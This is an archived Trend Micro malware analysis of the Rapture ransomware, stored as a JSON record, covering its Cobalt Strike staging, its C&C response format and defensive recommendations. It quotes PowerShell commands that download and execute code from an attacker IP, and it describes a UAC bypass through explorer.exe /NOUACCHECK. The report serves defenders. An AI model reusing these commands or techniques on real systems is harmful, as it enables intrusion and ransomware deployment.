{
    "id": "b628059b-6436-4c6b-9e63-f2513b15a68e",
    "created_at": "2023-06-05T02:07:40.511846Z",
    "updated_at": "2025-03-27T02:09:18.312289Z",
    "deleted_at": null,
    "sha1_hash": "11f38deb8f647ca956940299f11b96a5da1aec33",
    "title": "2023-04-28 - Rapture, a Ransomware Family With Similarities to Paradise",
    "authors": "",
    "file_creation_date": "2023-06-04T12:25:52Z",
    "file_modification_date": "2023-06-04T12:25:52Z",
    "file_size": 798967,
    "plain_text": "# Rapture, a Ransomware Family With Similarities to Paradise\n\n**[trendmicro.com/en_us/research/23/d/rapture-a-ransomware-family-with-similarities-to-paradise.html](https://www.trendmicro.com/en_us/research/23/d/rapture-a-ransomware-family-with-similarities-to-paradise.html)**\n\nRansomware\n\n\nApril 28, 2023\n\n\nIn March and April 2023, we observed a type of ransomware targeting its victims via a\nminimalistic approach with tools that leave only a minimal footprint behind. Our findings\nrevealed many of the preparations made by the perpetrators and how quickly they managed\nto carry out the ransomware attack.\n\nBy: Don Ovid Ladores, Ian Kenefick, Earle Maui Earnshaw\nApril 28, 2023\nRead time: (\nwords)\n\n## Introduction\n\n[In March and April 2023, we observed a type of ransomware targeting its victims via a](https://www.trendmicro.com/vinfo/ph/security/definition/Ransomware)\nminimalistic approach with tools that leave only a minimal footprint behind. Our findings\nrevealed many of the preparations made by the perpetrators and how quickly they managed\nto carry out the ransomware attack.\n\nThe memory dump during the ransomware’s execution reveals an RSA key configuration file\nsimilar to that used by the [Paradise ransomware. To make analysis more difficult, the](https://www.trendmicro.com/vinfo/ph/security/news/cybercrime-and-digital-threats/new-variant-of-paradise-ransomware-spreads-through-iqy-files)\n[attackers packed the Rapture ransomware using Themida, a commercial packer. Rapture](https://www.oreans.com/Themida.php)\nrequires at least a .NET 4.0 framework for proper execution; this suggests more similarities\nwith Paradise, which has been known to be compiled as a .NET executable. For this reason,\nwe dubbed this ransomware type as Rapture, a closely related nomenclature to Paradise.\n\nIt is important to note that although it shares certain similarities with Paradise, Rapture’s\nbehavior is different from the former.\n\n## Discovery, reconnaissance, and staging        \n\nIn April, we found a couple of ransomware activities that appear to be injected in legitimate\nprocesses. By tracing these activities back to the source process, we found that the\n[ransomware appeared as an activity loaded into memory from a Cobalt Strike beacon. In](https://www.trendmicro.com/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html)\nsome instances, the attackers dropped the ransomware in a folder or drive as a *.log file:\n\n\n-----\n\n_E:\\ITS.log_\n_C:\\[Redacted]\\Aps.log_\n\nFigure 1. The ransomware file packed using Themida\nThe Rapture ransomware drops its notes to every traversed directory (the first six characters\nmight appear to random, but they are actually hard-coded string configurations).\n\n_7qzxid-README.txt_\n_qiSgqu-README.txt_\n\nIt then appends the same six characters to the following encrypted files:\n\n_*.7qzxid_\n_*.qiSgqu_\n\nRapture requires certain command lines (shown in Figure 2) to execute properly. Once the\ncorrect argument is passed to the malicious file, it will start the ransomware routine as also\ndisplayed in its console window.\n\nAll\n\n\n-----\n\nFigure 2. Execution of the Rapture ransomware using the correct command-line arguments\n(top) and the console window during ransomware execution (bottom)\n[The dropped ransom note bears some resemblance to the Zeppelin ransomware (although](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-recap-snatch-and-zeppelin-ransomware)\nwe believe this is the only connection between the two). We tried to gleam additional\ninformation from the ransom note and discovered that the Rapture ransomware has been\n[around for a while now, but there were no samples available during its initial sighting.](https://bbs.360.cn/thread-16071225-1-1.html)\n\n\n-----\n\nFigure 3. The dropped ransom note\nDuring our investigation, we discovered that the whole infection chain spans three to five\ndays at most (counting from the time of discovery of the reconnaissance commands).\nRapture’s operators first perform the following, likely to guarantee a more successful attack:\n\nInspect firewall policies\nCheck the PowerShell version\n[Check for vulnerable Log4J applets](https://www.trendmicro.com/en_us/apache-log4j-vulnerability.html)\n\nFigure 4. One of the PowerShell command lines found during the reconnaissance stage\nAfter a successful reconnaissance routine, the attackers proceed with the first stage of the\nattack by downloading and executing a PowerShell script to install Cobalt Strike in the\ntarget’s system.\n\nAfter the reconnaissance stage, the attackers will try to gain access to the victim’s network\n(likely through vulnerable public-facing websites and servers since their initial entry is via\n_w3wp.exe for PowerShell execution)._\n\nThe following command is used for the first execution instance of PowerShell through\n_w3wp.exe:_\n\n_/c powershell set-alias -name aspersky -value Invoke-Expression;aspersky(New-Object_\n_Net.WebClient).DownloadString(‘[hxxp]://195.123.234[.]101:80/Sharepoint/Pickers.aspx’)_\n\nMeanwhile, the second execution instance, this time from Windows Management\nInstrumentation (WMI), is done via the following command:\n\n\n-----\n\n_/c powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-_\n_Object Net.WebClient).DownloadString('[hxxp]://195.123.234[.]101:80/Microsoft/Online')_\n\nFigure 5. PowerShell of the first-stage downloader\nThe attacks use a unique method of obtaining higher privileges to execute the payload. By\ndefault, there is a task in newer versions of Windows called\n_[CreateExplorerShellUnelevatedTask that prevents explorer.exe from running with elevated](https://devblogs.microsoft.com/oldnewthing/20220524-00/?p=106682)_\nprivileges. However, if explorer.exe is launched using the command line /NOUACCHECK, it\ninherits the elevated status from the parent process. In this case, the malicious actors\ninjected the malicious activity into an existing svchost.exe, which serves as the parent\nprocess. The svchost.exe process then executes explorer.exe using the /NOUACCHECK\ncommand. Once this is done, explorer.exe can then be used to drop and execute the second\nstage Cobalt Strike beacon downloader.\n\nThe second-stage downloader will then connect to the following address to download the\nmain Cobalt Strike beacon: 195.123.234[.]101/DoFor/review/Mcirosoft\n\nThe data response from the command-and-control (C&C) server contains the encrypted\nbeacon sandwiched in the middle of a JavaScript file (with the script code bearing no actual\nusage or significance for the malware chain). The downloader decrypts the sandwiched code\nand then executes the Cobalt Strike beacon.\n\n\n-----\n\nFigure 6. The Cobalt Strike downloader C&C server response containing the encrypted\nbeacon\nThe second (main) stage beacon will attempt to connect to another subfolder in the same\nC&C server, where it will attempt to receive the backdoor command and other payloads.\nSimilarly, the response of the C&C server is also sandwiched in another JavaScript code that\nwill be decoded by the following beacon: 195.123.234[.]101/Make/v8.01/Sharepoint\n\nBased on our analysis of the decrypted C&C response from the beacon, we have deduced\nthat the decoded content will have the following structure (after the beacon removes the\ngarbage padding):\n\n**Offset** **Length** **Data** **Description**\n\n0x00 0x04 N/A Four-byte header\n\n0x04 0x04 0x04000000 Flag (big endian will convert to little endian after\ndecryption)\n\n0x08 0x04 0xnn000000 Backdoor command (big endian will convert to little\nendian after decryption)\n\n0x0c 0x04 N/A Data size, length of additional data from the response;\nbig endian will convert to little endian after decryption\n\n\n0x10 Depends\non [0x0c]\n\n\nN/A Additional data to be supplied to some of the backdoor\ncommands\n\n\n-----\n\nTable 1. The structure of the decrypted C&C server response from the beacon communication\n\nWe found that the beacon performed ransomware activities in majority of the affected\nsystems, which implies that the code is downloaded and executed in memory except for a\nfew machines where we found the actual ransomware.\n\nWe tried to gather more information about the Cobalt Strike beacon via its watermark, where\nwe discovered that the same watermark is also used by other threat actors. This indicates\nthat it is likely that Rapture’s operators are using a pirated Windows license which is also\nbeing used by several others.\n\nFigure 7. The particular Cobalt Strike watermark as seen in relation to different groups\n\n## Conclusion\n\nThe Rapture ransomware is cleverly designed and bears some similarities to other\nransomware families such as Paradise. Although its operators use tools and resources that\nare readily available, they have managed to use them in a way that enhances Rapture’s\ncapabilities by making it stealthier and more difficult to analyze. As is the case with many\nmodern families, these types of fairly sophisticated ransomware are beginning to become the\nnorm in many present-day campaigns.\n\n\n-----\n\n## Recommendations and Solutions\n\nTo protect their systems from ransomware attacks, organizations can implement security\nframeworks that systematically allocate resources to establish a robust defense strategy.\nHere are some recommended guidelines for organizations consider:\n\nConduct an inventory of assets and data.\nIdentify authorized and unauthorized devices and software.\nAudit event and incident logs\nManage hardware and software configurations.\nGrant admin privileges and access only when necessary for an employee's role.\nMonitor network ports, protocols, and services.\nEstablish a software allowlist that only allows legitimate applications to execute.\nImplement data protection, backup, and recovery measures.\nEnable multifactor authentication (MFA).\nDeploy the latest versions of security solutions to all layers of the system, including\nemail, endpoint, web, and network.\nWatch for early signs of an attack, such as the presence of suspicious tools in the\nsystem.\n\nOrganizations can adopt a multifaceted approach to secure potential entry points into their\nsystems, such as endpoints, emails, webs, and networks. By using security solutions that\ncan detect malicious elements and questionable activities, enterprises can protect\nthemselves from ransomware attacks.\n\nA multilayered approach can help organizations guard possible entry points into their system\n(endpoint, email, web, and network). Security solutions can detect malicious components\nand suspicious behavior, which can help protect enterprises.\n\n[Trend Micro Vision One™ provides multilayered protection and behavior detection,](https://www.trendmicro.com/en_us/business/products/detection-response.html)\nwhich helps block questionable behavior and tools before the ransomware can do any\ndamage.\n[Trend Micro Cloud One™ – Workload Security protects systems against both known](https://www.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-workload-security.html)\nand unknown threats that exploit vulnerabilities. This protection is made possible\nthrough techniques such as virtual patching and machine learning.\n[Trend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and](https://www.trendmicro.com/en_us/business/products/user-protection/sps/email-and-collaboration/email-inspector.html)\nadvanced analysis techniques to effectively block malicious emails, including phishing\nemails that can serve as entry points for ransomware.\n[Trend Micro Apex One™ offers next-level automated threat detection and response](https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html)\nagainst advanced concerns such as fileless threats and ransomware, ensuring the\nprotection of endpoints.\n\n\n-----\n\n**Indicators of Compromise (IOCs)**\n\n[The indicators of compromise for this entry can be found here.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/23/d/rapture-a-ransomware-family-with-similarities-to-paradise/iocs-rapture-a-ransomware-family-with-similarities-to-paradise-final-list.txt)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-04-28 - Rapture, a Ransomware Family With Similarities to Paradise.pdf"
    ],
    "report_names": [
        "2023-04-28 - Rapture, a Ransomware Family With Similarities to Paradise.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1685930860,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1685881552,
    "ts_modification_date": 1685881552,
    "files": {
        "pdf": "https://archive.orkl.eu/11f38deb8f647ca956940299f11b96a5da1aec33.pdf",
        "text": "https://archive.orkl.eu/11f38deb8f647ca956940299f11b96a5da1aec33.txt",
        "img": "https://archive.orkl.eu/11f38deb8f647ca956940299f11b96a5da1aec33.jpg"
    }
}